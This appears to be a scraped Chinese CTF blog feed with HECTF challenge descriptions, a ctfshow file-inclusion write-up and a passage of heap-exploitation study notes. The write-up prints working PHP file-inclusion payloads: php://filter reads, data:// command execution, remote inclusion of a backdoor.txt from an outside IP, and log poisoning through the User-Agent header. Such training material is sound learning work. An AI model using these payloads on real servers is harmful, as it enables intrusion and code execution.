<strong>恶势力的聊天记录</strong></h3><p>题目描述：</p><blockquote><p>附件下载地址： 链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p></blockquote><p>答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p><h3 id="baby_unserialize-3"><a class="markdownIt-Anchor" href="#baby_unserialize-3">#</a> <strong>baby_unserialize</strong></h3><p>题目描述：</p><blockquote><p>一个简单的反序列化，一个简单的 RCE</p></blockquote><h3 id="你一个人专属的进货网站-3"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站-3">#</a> <strong>你一个人专属的进货网站</strong></h3><p>题目描述：</p><blockquote><p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p></blockquote><h3 id="ezweb-3"><a class="markdownIt-Anchor" href="#ezweb-3">#</a> <strong>ezweb</strong></h3><p>题目描述：</p><blockquote><p>Try to be admin to get flag！！！</p><p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p></blockquote><h3 id="ezjava-3"><a class="markdownIt-Anchor" href="#ezjava-3">#</a> ezjava</h3><p>题目描述：</p><blockquote><p>A 了这道题，我就承认你是真正的奶龙</p></blockquote><h2 id="re-3"><a class="markdownIt-Anchor" href="#re-3">#</a> Re</h2><h3 id="babyre-3"><a class="markdownIt-Anchor" href="#babyre-3">#</a> <strong>babyre</strong></h3><p>题目描述：</p><blockquote><p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p></blockquote><h3 id="littleasm-2"><a class="markdownIt-Anchor" href="#littleasm-2">#</a> <strong>littleasm</strong></h3><p>题目描述：</p><blockquote><p>百行代码里的藏匿的 flag</p></blockquote><h3 id="pepy-2"><a class="markdownIt-Anchor" href="#pepy-2">#</a> <strong>PE?py?</strong></h3><p>题目描述：</p><blockquote><p>在 pyre 里找到压缩包密码</p></blockquote><h3 id="easyree-2"><a class="markdownIt-Anchor" href="#easyree-2">#</a> <strong>easyree</strong></h3><p>题目描述：</p><blockquote xxxx=""><p>flag 格式 HECTF</p></blockquote><h3 id="ezandroid-2"><a class="markdownIt-Anchor" href="#ezandroid-2">#</a> <strong>ezAndroid</strong></h3><p>题目描述：</p><blockquote></blockquote><h2 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3">#</a> Pwn</h2><h3 id="sign-in-3"><a class="markdownIt-Anchor" href="#sign-in-3">#</a> <strong>sign in</strong></h3><p>题目描述：</p><blockquote><p>快来签到吧…</p></blockquote><h3 id="find-eggy-3"><a class="markdownIt-Anchor" href="#find-eggy-3">#</a> <strong>find eggy</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="arcaea_sorting-3"><a class="markdownIt-Anchor" href="#arcaea_sorting-3">#</a> <strong>Arcaea_Sorting</strong></h3><p>题目描述：</p><blockquote><p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p><p>听好了：</p><p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p><p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p><p>至此，一锤定音。</p><p>尘埃，已然落定。</p><p>#HECTF #听好了 #韵律源点</p></blockquote><h3 id="arcaea_sorting_revenge-3"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-3">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>题目描述：</p><blockquote><p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p></blockquote><h3 id="喵喵喵-2"><a class="markdownIt-Anchor" href="#喵喵喵-2">#</a> <strong>喵喵喵</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="lip-2"><a class="markdownIt-Anchor" href="#lip-2">#</a> <strong>lip</strong></h3><p>题目描述：</p><blockquote></blockquote><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3">#</a> Crypto</h2><h3 id="迷茫的艾米莉-3"><a class="markdownIt-Anchor" href="#迷茫的艾米莉-3">#</a> <strong>迷茫的艾米莉</strong></h3><p>题目描述：</p><blockquote><p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p></blockquote><h3 id="翻一翻-3"><a class="markdownIt-Anchor" href="#翻一翻-3">#</a> <strong>翻一翻</strong></h3><p>题目描述：</p><blockquote><p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p></blockquote><h3 id="seven-more-3"><a class="markdownIt-Anchor" href="#seven-more-3">#</a> <strong>seven more</strong></h3><p>题目描述：</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="情书与破碎的证书-3"><a class="markdownIt-Anchor" href="#情书与破碎的证书-3">#</a> <strong>情书与破碎的证书</strong></h3><p>题目描述：</p><blockquote><p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p><p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p></blockquote><h3 id="不合格的魔药-3"><a class="markdownIt-Anchor" href="#不合格的魔药-3">#</a> <strong>不合格的魔药</strong></h3><p>题目描述：</p><blockquote><p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p></blockquote><h2 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3">#</a> Misc</h2><h3 id="rem_you-2"><a class="markdownIt-Anchor" href="#rem_you-2">#</a> <strong>Rem_You</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="funny-2"><a class="markdownIt-Anchor" href="#funny-2">#</a> <strong>funny</strong></h3><p>题目描述：</p><blockquote 省-市-广场名字-水边名字=""><p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p><p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p></blockquote><h3 id="简单的压缩包-3"><a class="markdownIt-Anchor" href="#简单的压缩包-3">#</a> <strong>简单的压缩包</strong></h3><p>题目描述：</p><blockquote><p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p></blockquote><h3 id="恶势力的仓库-2"><a class="markdownIt-Anchor" href="#恶势力的仓库-2">#</a> <strong>恶势力的仓库</strong></h3><p>题目描述：</p><blockquote><p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p></blockquote><h3 id="恶势力的聊天记录-2"><a class="markdownIt-Anchor" href="#恶势力的聊天记录-2">#</a> <strong>恶势力的聊天记录</strong></h3><p>题目描述：</p><blockquote><p>附件下载地址： 链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;ul class=&quot;markdownIt-TOC&quot;&gt;
&lt;li&gt;&lt;a href=&quot;#wp&quot;&gt;WP：&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web&quot;&gt;Web：&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#are-you-happy&quot;&gt;Are you happy?：&lt;</summary>
      
    
    
    
    <category term="CTFer的比赛之路" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-文件包含</title>
    <link href="http://blog.g01den.top/posts/ad175165.html"/>
    <id>http://blog.g01den.top/posts/ad175165.html</id>
    <published>2024-11-24T13:38:01.000Z</published>
    <updated>2024-12-09T13:21:11.773Z</updated>
    
    <content type="html"><![CDATA[<p>竞争包含先不写了，有时间再写。</p><h1 id="web78"><a class="markdownIt-Anchor" href="#web78">#</a> Web78</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​常规文件包含，直接读 flag.php，filter 伪协议：</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><h1 id="web79"><a class="markdownIt-Anchor" href="#web79">#</a> Web79：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这次有点不一样，带了个 str_replace 替换，所以读文件估计危险，打一打另外的操作</p><blockquote><p>?file=data://text/plain,<?=`tac f*`;?></p></blockquote><h1 id="web80"><a class="markdownIt-Anchor" href="#web80">#</a> Web80：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法一"><a class="markdownIt-Anchor" href="#解法一">#</a> 解法一：</h2><p>​远程文件包含，直接在服务器上写一个 txt 文件，之后 http 协议包含即可。</p><blockquote><p>?file=http://39.107.158.17/backdoor.txt</p></blockquote><h2 id="解法二"><a class="markdownIt-Anchor" href="#解法二">#</a> 解法二：</h2><p>​包含日志文件：</p><p>​通过 burp 抓包，改 user-agent，在其后面加一个 php 代码，比如 phpinfo，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>204e30c6-d77b-4e30-8694-5a79d576baf9.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 &lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​之后访问？file=/var/log/nginx/access.log 这个文件即可。</p><h1 id="web81"><a class="markdownIt-Anchor" href="#web81">#</a> Web81</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​和上一题一样，日志文件包含？file=/var/log/nginx/access.log 这个文件。</p><h1 id="web88"><a class="markdownIt-Anchor" href="#web88">#</a> Web88：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​没有过滤冒号，豆号，斜杠和分号，data 协议打 base64，去掉末尾的等号：</p><blockquote><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;竞争包含先不写了，有时间再写。&lt;/p&gt;
&lt;h1 id=&quot;web78&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web78&quot;&gt;#&lt;/a&gt; Web78&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记（12）--Chunk Extend and Overlapping</title>
    <link href="http://blog.g01den.top/posts/d1a08bca.html"/>
    <id>http://blog.g01den.top/posts/d1a08bca.html</id>
    <published>2024-11-11T11:51:40.000Z</published>
    <updated>2024-11-11T11:55:32.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn学习笔记12chunk-extend-and-overlapping"><a class="markdownIt-Anchor" href="#pwn学习笔记12chunk-extend-and-overlapping">#</a> pwn 学习笔记（12）–Chunk Extend and Overlapping</h1><p>​chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping（块重叠） 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="1-对inuse的fastbin进行extend"><a class="markdownIt-Anchor" href="#1-对inuse的fastbin进行extend">#</a> 1、对 inuse 的 fastbin 进行 extend：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​首先进行两次 malloc，之后看看 heap 的状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">In file: /mnt/hgfs/sharedict/ChunkExtend/extend.c</span><br><span class="line">    3     void *ptr,*ptr1;</span><br><span class="line">    4 </span><br><span class="line">    5     ptr=malloc(0x10);//分配第一个0x10的chunk</span><br><span class="line">    6     malloc(0x10);//分配第二个0x10的chunk</span><br><span class="line">    7 </span><br><span class="line"> ►  8     *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域</span><br><span class="line">    9 </span><br><span class="line">   10     free(ptr);</span><br><span class="line">   11     ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容</span><br><span class="line">   12     return 0;</span><br><span class="line">   13 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffde30 —▸ 0x555555758010 ◂— 0x0</span><br><span class="line">01:0008│     0x7fffffffde38 ◂— 0x0</span><br><span class="line">02:0010│ rbp 0x7fffffffde40 —▸ 0x5555555546e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">03:0018│     0x7fffffffde48 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">04:0020│     0x7fffffffde50 ◂— 0x1</span><br><span class="line">05:0028│     0x7fffffffde58 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe2ac ◂— &#x27;/mnt/hgfs/sharedict/ChunkExtend/test&#x27;</span><br><span class="line">06:0030│     0x7fffffffde60 ◂— 0x1f7ffcca0</span><br><span class="line">07:0038│     0x7fffffffde68 —▸ 0x55555555468a (main) ◂— push   rbp</span><br><span class="line">───────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────</span><br><span class="line"> ► f 0   0x5555555546aa main+32</span><br><span class="line">   f 1   0x7ffff7a2d840 __libc_start_main+240</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​有地址的话，就去读一下两个堆的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​下一步开始释放，看一看修改 chunk1 的 size 域大小：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>​发现 chunk2 被修改后增大了的 chunk1 给那占了，heap 里就只有一个 Chunk 了，看看内存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 